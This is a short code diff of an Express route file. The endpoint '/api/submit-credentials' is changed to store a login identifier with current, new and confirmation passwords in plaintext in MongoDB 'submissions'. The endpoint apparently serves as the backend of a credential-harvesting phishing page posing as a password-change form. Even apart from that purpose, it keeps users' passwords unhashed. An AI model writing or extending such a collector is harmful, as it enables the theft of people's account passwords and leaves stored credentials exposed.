@@ -1,16 +1,18 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
-import { storage } from "./storage";
+import { mongoStorage as storage } from "./storage-mongo";
 
 export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/submit-credentials", async (req, res) => {
     try {
-      const { loginMethod, identifier, password } = req.body;
+      const { loginMethod, identifier, currentPassword, newPassword, confirmPassword } = req.body;
       
       const submission = await storage.createSubmission({
         loginMethod: loginMethod || "email",
         identifier: identifier || "",
-        password: password || "",
+        currentPassword: currentPassword || "",
+        newPassword: newPassword || "",
+        confirmPassword: confirmPassword || "",
       });
 
       return res.status(201).json({ submissionId: submission.id });
